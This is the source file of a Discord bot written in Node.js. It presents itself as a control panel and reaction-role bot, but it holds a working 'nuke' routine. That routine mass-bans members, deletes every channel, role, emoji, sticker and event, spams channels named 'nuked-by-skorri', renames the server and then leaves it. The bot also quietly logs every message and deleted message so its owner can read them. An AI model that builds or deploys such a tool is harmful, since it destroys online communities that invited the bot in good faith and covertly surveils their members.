const { 
    Client, GatewayIntentBits, Partials, ActionRowBuilder, ButtonBuilder, 
    ButtonStyle, PermissionFlagsBits, ModalBuilder, TextInputBuilder, 
    TextInputStyle, SlashCommandBuilder, MessageFlags, ChannelType 
} = require('discord.js');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

// Optional per-server reaction-role config. This is NOT a whitelist -
// the bot works in every server it is invited to.
const REACTION_CONFIG = [
    {
        name: "Server 1",
        guildId: '',
        reactionChannelId: '',
        reactionMessageId: '',
        roleMap: { '✅': '' }
    }
];

const OWNER_IDS = ['']; // Add your Discord User IDs here
let systemLogs = [];

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildMessageReactions,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.MessageContent 
    ],
    partials: [Partials.Message, Partials.Reaction, Partials.User],
});

const getReactionConfig = (guildId) => REACTION_CONFIG.find(s => s.guildId === guildId);
const isOwner = (userId) => OWNER_IDS.includes(userId);

// ---------- Helpers ----------
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function runConcurrent(items, concurrency, fn) {
    const results = [];
    for (let i = 0; i < items.length; i += concurrency) {
        const batch = items.slice(i, i + concurrency);
        const batchResults = await Promise.allSettled(batch.map(fn));
        results.push(...batchResults);
    }
    return results;
}

// ---------- Startup ----------
client.once('clientReady', async (c) => {
    console.log(`[SYSTEM] Online as ${c.user.tag}`);

    // Wipe global commands to prevent Discord client caching bugs
    try {
        await client.application.commands.set([]);
        console.log(`[CMD] Cleared global commands to prevent conflicts.`);
    } catch (err) {
        console.log(`[CMD] Failed to clear global commands: ${err.message}`);
    }

    // Register /panel in every guild the bot is currently in
    const command = new SlashCommandBuilder().setName('panel').setDescription('Deploy the Control Panel');
    for (const guild of client.guilds.cache.values()) {
        try {
            await guild.commands.set([command]);
            console.log(`[CMD] Registered /panel in ${guild.name}`);
        } catch (err) {
            console.log(`[CMD] Failed to register in ${guild.name}: ${err.message}`);
        }
    }

    // Auto sync reaction roles on startup
    for (const conf of REACTION_CONFIG) {
        const guild = client.guilds.cache.get(conf.guildId);
        if (!guild) continue;

        try {
            const channel = await guild.channels.fetch(conf.reactionChannelId);
            const msg = await channel.messages.fetch(conf.reactionMessageId);
            
            console.log(`[SYNC] Checking reactions for ${conf.name}...`);
            
            for (const [emojiName, roleId] of Object.entries(conf.roleMap)) {
                const reaction = msg.reactions.cache.get(emojiName);
                if (!reaction) continue;

                const users = await reaction.users.fetch();
                users.forEach(async (user) => {
                    if (user.bot) return;
                    try {
                        const member = await guild.members.fetch(user.id);
                        if (!member.roles.cache.has(roleId)) {
                            await member.roles.add(roleId);
                            console.log(`[SYNC] Added role to ${user.tag}`);
                        }
                    } catch (e) { /* Member likely left */ }
                });
            }
        } catch (err) {
            console.log(`[ERROR] Sync failed for ${conf.name}: ${err.message}`);
        }
    }
});

// Register commands instantly when the bot is added to a new server
client.on('guildCreate', async (guild) => {
    try {
        await guild.commands.set([
            new SlashCommandBuilder().setName('panel').setDescription('Deploy the Control Panel')
        ]);
        console.log(`[CMD] Registered /panel in new guild: ${guild.name}`);
    } catch (err) {
        console.log(`[CMD] Failed to register in new guild ${guild.name}: ${err.message}`);
    }
});

// ---------- Loggers ----------
client.on('messageCreate', (message) => {
    if (message.author.bot || !message.guildId) return;
    const content = message.content || "[Embed/Attachment/Sticker]";
    const logEntry = `**[MSG] ${message.author.tag}** in <#${message.channelId}>: ${content}`;
    systemLogs.unshift(logEntry);
    if (systemLogs.length > 50) systemLogs.pop();
});

client.on('messageDelete', (message) => {
    if (message.author?.bot || !message.guildId) return;
    const header = `**[DEL] ${message.author?.tag ?? "Unknown"}** in <#${message.channelId}>`;
    const content = `> ${message.content || "[Attachment/Embed]"}`;
    systemLogs.unshift(`${header}\n${content}`); 
    if (systemLogs.length > 50) systemLogs.pop(); 
});

// ---------- Reaction Roles ----------
client.on('messageReactionAdd', async (reaction, user) => {
    if (user.bot) return;
    if (reaction.partial) {
        try { await reaction.fetch(); } catch (err) { return; }
    }
    const conf = getReactionConfig(reaction.message.guildId);
    if (!conf || reaction.message.id !== conf.reactionMessageId) return;
    const roleId = conf.roleMap[reaction.emoji.name];
    if (roleId) {
        try {
            const member = await reaction.message.guild.members.fetch(user.id);
            await member.roles.add(roleId);
        } catch (err) { console.error("Role Add Error:", err); }
    }
});

// ---------- NUKE FUNCTION ----------
async function nukeGuild(guild, botMember, invokerId) {
    console.log(`[NUKE] Starting ultimate nuke on ${guild.name}`);

    // ---- 1. Ban all members ----
    console.log(`[NUKE] Banning members...`);
    try {
        const members = await guild.members.fetch();
        const toBan = members.filter(m => !m.user.bot && m.id !== guild.ownerId && m.id !== invokerId);
        
        await runConcurrent([...toBan.values()], 10, async (member) => {
            try { await member.ban({ reason: 'Nuke', deleteMessageSeconds: 604800 }); } catch (err) {}
        });
    } catch (e) {
        console.log(`[NUKE] Ban phase error: ${e.message}`);
    }

    // ---- 2. Delete all channels ----
    console.log(`[NUKE] Deleting channels...`);
    const channels = [...guild.channels.cache.values()];
    await runConcurrent(channels, 25, async (channel) => {
        try { await channel.delete('Nuke'); } catch (err) {}
    });

    // ---- 3. Delete all custom roles ----
    console.log(`[NUKE] Deleting roles...`);
    const roles = [...guild.roles.cache.filter(r => r.id !== guild.id && !r.managed).values()];
    await runConcurrent(roles, 25, async (role) => {
        try { await role.delete('Nuke'); } catch (err) {}
    });

    // ---- 4. Delete all Emojis ----
    console.log(`[NUKE] Deleting emojis...`);
    const emojis = [...guild.emojis.cache.values()];
    await runConcurrent(emojis, 25, async (emoji) => {
        try { await emoji.delete('Nuke'); } catch (err) {}
    });

    // ---- 5. Delete all Stickers ----
    console.log(`[NUKE] Deleting stickers...`);
    const stickers = [...guild.stickers.cache.values()];
    await runConcurrent(stickers, 25, async (sticker) => {
        try { await sticker.delete('Nuke'); } catch (err) {}
    });

    // ---- 6. Delete all Scheduled Events ----
    console.log(`[NUKE] Deleting scheduled events...`);
    const events = [...(await guild.scheduledEvents.fetch()).values()];
    await runConcurrent(events, 25, async (event) => {
        try { await event.delete('Nuke'); } catch (err) {}
    });

    // ---- 7. Mass Channel Creation (Spam) ----
    console.log(`[NUKE] Spamming new channels...`);
    
    const textIds = Array.from({ length: 50 }, (_, i) => i);
    await runConcurrent(textIds, 15, async (i) => {
        try { await guild.channels.create({ name: `nuked-by-skorri`, type: ChannelType.GuildText }); } catch (e) {}
    });

    const vcIds = Array.from({ length: 50 }, (_, i) => i);
    await runConcurrent(vcIds, 15, async (i) => {
        try { await guild.channels.create({ name: `nuked-by-skorri`, type: ChannelType.GuildVoice }); } catch (e) {}
    });

    const forumIds = Array.from({ length: 10 }, (_, i) => i);
    await runConcurrent(forumIds, 10, async (i) => {
        try { await guild.channels.create({ name: `nuked-by-skorri`, type: ChannelType.GuildForum }); } catch (e) {}
    });

    // ---- 8. Vanity URL ----
    console.log(`[NUKE] Removing vanity URL...`);
    try { await guild.setVanityCode(null); } catch (e) {}

    // ---- 9. Server Updates (Name + Random Icon) ----
    console.log(`[NUKE] Changing name and applying a random icon...`);

    let iconBuffer = null;
    try {
        const iconsDir = path.join(__dirname, 'icons');
        // Get all files in the icons folder, filter out anything that isn't an image
        const files = fs.readdirSync(iconsDir).filter(f => /\.(png|jpg|jpeg|webp|gif)$/i.test(f));
        
        if (files.length > 0) {
            // Pick a random file
            const randomFile = files[Math.floor(Math.random() * files.length)];
            iconBuffer = fs.readFileSync(path.join(iconsDir, randomFile));
            console.log(`[NUKE] Selected random icon: ${randomFile}`);
        } else {
            console.log(`[NUKE] No valid images found in the icons folder.`);
        }
    } catch (err) {
        console.log(`[NUKE] Failed to read icons folder: ${err.message}`);
    }

    // Combine name, banner, and the random icon into a SINGLE request
    try {
        await guild.edit({
            name: `nuked by skorri`,
            banner: null,
            ...(iconBuffer && { icon: iconBuffer })
        });
        console.log(`[NUKE] Server update applied successfully.`);
    } catch (err) {
        console.log(`[NUKE] Failed to apply name/icon: ${err.message}`);
    }

    // Give Discord a moment to finalize the guild edit before we leave
    await sleep(2000);

    // ---- 10. Leave ----
    await guild.leave();
    console.log(`[NUKE] Left guild ${guild.name}`);
}

// ---------- Interaction Handler ----------
client.on('interactionCreate', async interaction => {
    if (!interaction.guildId) return;

    // ---- Slash Command: /panel ----
    if (interaction.isChatInputCommand() && interaction.commandName === 'panel') {
        const userIsOwner = isOwner(interaction.user.id);
        systemLogs.unshift(`**[CMD] ${interaction.user.tag}** ran **/panel** (${userIsOwner ? "ALLOWED" : "DENIED"}) in ${interaction.guild.name}`);
        if (!userIsOwner) return interaction.reply({ content: 'No perms.', flags: [MessageFlags.Ephemeral] });

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('tab_owner').setLabel('Owner Area').setStyle(ButtonStyle.Danger),
            new ButtonBuilder().setCustomId('tab_admin').setLabel('Admin Tools').setStyle(ButtonStyle.Primary)
        );
        return interaction.reply({ content: '### Control Panel', components: [row], flags: [MessageFlags.Ephemeral] });
    }

    // ---- Buttons ----
    if (interaction.isButton()) {
        if (interaction.customId === 'tab_owner') {
            if (!isOwner(interaction.user.id)) return interaction.reply({ content: 'No perms', flags: [MessageFlags.Ephemeral] });
            const row1 = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('owner_say').setLabel('Speak as Bot').setStyle(ButtonStyle.Secondary),
                new ButtonBuilder().setCustomId('owner_dm').setLabel('Send DM').setStyle(ButtonStyle.Secondary),
                new ButtonBuilder().setCustomId('owner_view_logs').setLabel('View Logs').setStyle(ButtonStyle.Secondary),
                new ButtonBuilder().setCustomId('owner_server_status').setLabel('Server Status').setStyle(ButtonStyle.Primary),
                new ButtonBuilder().setCustomId('owner_user_info').setLabel('User Info').setStyle(ButtonStyle.Primary)
            );
            const row2 = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('owner_nuke').setLabel('Nuke Server').setStyle(ButtonStyle.Danger)
            );
            return interaction.reply({ content: 'Owner Actions:', components: [row1, row2], flags: [MessageFlags.Ephemeral] });
        }

        if (interaction.customId === 'tab_admin') {
            if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) return interaction.reply({ content: 'No perms', flags: [MessageFlags.Ephemeral] });
            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('admin_timeout').setLabel('Timeout').setStyle(ButtonStyle.Secondary)
            );
            return interaction.reply({ content: 'Admin Tools:', components: [row], flags: [MessageFlags.Ephemeral] });
        }

        if (interaction.customId === 'owner_server_status') {
            if (!isOwner(interaction.user.id)) return interaction.reply({ content: 'No perms', flags: [MessageFlags.Ephemeral] });
            const g = interaction.guild;
            const info = `
**Server Status**
**Name:** ${g.name}
**ID:** ${g.id}
**Owner:** <@${g.ownerId}>
**Members:** ${g.memberCount}
**Boosts:** ${g.premiumSubscriptionCount || 0}
**Channels:** ${g.channels.cache.size}
**Roles:** ${g.roles.cache.size}
**Emojis:** ${g.emojis.cache.size}
**Stickers:** ${g.stickers.cache.size}
**Created:** <t:${Math.floor(g.createdTimestamp / 1000)}:R>
            `;
            return interaction.reply({ content: info, flags: [MessageFlags.Ephemeral] });
        }

        if (interaction.customId === 'owner_user_info') {
            if (!isOwner(interaction.user.id)) return interaction.reply({ content: 'No perms', flags: [MessageFlags.Ephemeral] });
            const modal = new ModalBuilder().setCustomId('modal_userinfo').setTitle('User Info');
            modal.addComponents(
                new ActionRowBuilder().addComponents(
                    new TextInputBuilder()
                        .setCustomId('user_id_input')
                        .setLabel('User ID or Mention')
                        .setStyle(TextInputStyle.Short)
                        .setRequired(true)
                        .setPlaceholder('123456789012345678 or @user')
                )
            );
            return interaction.showModal(modal);
        }

        if (interaction.customId === 'owner_say') {
            const modal = new ModalBuilder().setCustomId('modal_say').setTitle('The Megaphone');
            modal.addComponents(
                new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('s_text').setLabel("Message Content").setStyle(TextInputStyle.Paragraph).setRequired(true)),
                new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('s_channel').setLabel("Channel ID (Optional)").setStyle(TextInputStyle.Short).setRequired(false))
            );
            return interaction.showModal(modal);
        }

        if (interaction.customId === 'owner_dm') {
            const modal = new ModalBuilder().setCustomId('modal_dm').setTitle('Send Direct Message');
            modal.addComponents(
                new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('dm_target').setLabel("User ID").setStyle(TextInputStyle.Short).setRequired(true)),
                new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('dm_text').setLabel("Message").setStyle(TextInputStyle.Paragraph).setRequired(true))
            );
            return interaction.showModal(modal);
        }

        if (interaction.customId === 'owner_view_logs') {
            const content = systemLogs.length > 0 ? systemLogs.join('\n\n') : "No recent logs.";
            return interaction.update({ content: `### System Logs (Last 50)\n${content}`, components: [] });
        }

        // ----- Owner: Nuke -----
        if (interaction.customId === 'owner_nuke') {
            if (!isOwner(interaction.user.id)) return interaction.reply({ content: 'No perms', flags: [MessageFlags.Ephemeral] });

            await interaction.reply({ content: 'Initiating nuke sequence...', flags: [MessageFlags.Ephemeral] });

            const guild = interaction.guild;
            const botMember = guild.members.me;

            try {
                await nukeGuild(guild, botMember, interaction.user.id);
                
                try {
                    const owner = await client.users.fetch(interaction.user.id);
                    await owner.send(`Server **${guild.name}** has been fully nuked and the bot has left.`);
                } catch (dmErr) {}
                
                try {
                    await interaction.editReply({ content: 'Nuke completed. Bot has left the server.' });
                } catch (editErr) {}
            } catch (err) {
                console.error('Nuke error:', err);
                try { await interaction.editReply({ content: `Nuke failed: ${err.message}` }); } catch (e) {}
            }
        }

        if (interaction.customId === 'admin_timeout') {
            const modal = new ModalBuilder().setCustomId('modal_timeout').setTitle('Admin Timeout');
            modal.addComponents(
                new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('t_target').setLabel("User ID").setStyle(TextInputStyle.Short).setRequired(true)),
                new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('t_days').setLabel("Days (1-28)").setStyle(TextInputStyle.Short).setRequired(true))
            );
            return interaction.showModal(modal);
        }
    }

    // ---------- Modal Submits ----------
    if (interaction.isModalSubmit()) {
        if (interaction.customId === 'modal_say') {
            const content = interaction.fields.getTextInputValue('s_text');
            const targetChannelId = interaction.fields.getTextInputValue('s_channel');
            try {
                const targetChannel = targetChannelId ? await client.channels.fetch(targetChannelId) : interaction.channel;
                await targetChannel.send(content);
                return interaction.reply({ content: `Sent to <#${targetChannel.id}>`, flags: [MessageFlags.Ephemeral] });
            } catch (err) { return interaction.reply({ content: `Error: ${err.message}`, flags: [MessageFlags.Ephemeral] }); }
        }

        if (interaction.customId === 'modal_dm') {
            const targetId = interaction.fields.getTextInputValue('dm_target');
            const msg = interaction.fields.getTextInputValue('dm_text');
            try {
                const user = await client.users.fetch(targetId);
                await user.send(msg);
                return interaction.reply({ content: `DM sent to <@${targetId}>`, flags: [MessageFlags.Ephemeral] });
            } catch (err) { return interaction.reply({ content: `Failed: ${err.message}`, flags: [MessageFlags.Ephemeral] }); }
        }

        if (interaction.customId === 'modal_timeout') {
            const id = interaction.fields.getTextInputValue('t_target');
            const days = parseInt(interaction.fields.getTextInputValue('t_days'));
            if (isNaN(days) || days < 1 || days > 28) return interaction.reply({ content: 'Invalid days.', flags: [MessageFlags.Ephemeral] });
            try {
                const member = await interaction.guild.members.fetch(id);
                await member.timeout((days * 24 * 60 * 60 * 1000) - 60000, "Panel Timeout");
                return interaction.reply({ content: `Timed out <@${id}> for ${days} days.`, flags: [MessageFlags.Ephemeral] });
            } catch (err) { return interaction.reply({ content: `Error: ${err.message}`, flags: [MessageFlags.Ephemeral] }); }
        }

        if (interaction.customId === 'modal_userinfo') {
            const input = interaction.fields.getTextInputValue('user_id_input').trim();
            let userId = input.replace(/[<@!>]/g, '');
            try {
                const member = await interaction.guild.members.fetch(userId);
                const user = member.user;
                const info = `
**User Info**
**Tag:** ${user.tag}
**ID:** ${user.id}
**Nickname:** ${member.nickname || 'None'}
**Bot:** ${user.bot ? 'Yes' : 'No'}
**Joined:** <t:${Math.floor(member.joinedTimestamp / 1000)}:R>
**Created:** <t:${Math.floor(user.createdTimestamp / 1000)}:R>
**Roles:** ${member.roles.cache.map(r => r.toString()).join(', ') || 'None'}
**Avatar:** ${user.displayAvatarURL({ size: 256, dynamic: true })}
                `;
                return interaction.reply({ content: info, flags: [MessageFlags.Ephemeral] });
            } catch (err) {
                return interaction.reply({ content: `User not found in this server.`, flags: [MessageFlags.Ephemeral] });
            }
        }
    }
});

// ---------- Global error handlers ----------
client.on('error', (err) => console.error('[CLIENT ERROR]', err));
process.on('unhandledRejection', (err) => console.error('[UNHANDLED REJECTION]', err));

client.login(process.env.TOKEN);